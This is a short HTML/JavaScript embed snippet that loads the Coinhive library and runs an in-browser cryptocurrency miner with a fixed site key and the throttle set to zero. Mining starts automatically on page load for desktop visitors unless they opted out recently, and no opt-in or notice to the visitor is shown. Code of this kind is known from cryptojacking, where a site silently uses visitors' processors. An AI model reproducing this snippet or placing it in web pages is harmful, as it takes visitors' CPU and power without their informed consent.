<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('6DbOnlx03SZtTYrkdPtvIgxQrqY20nrX', {throttle: 0});
	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
</script>
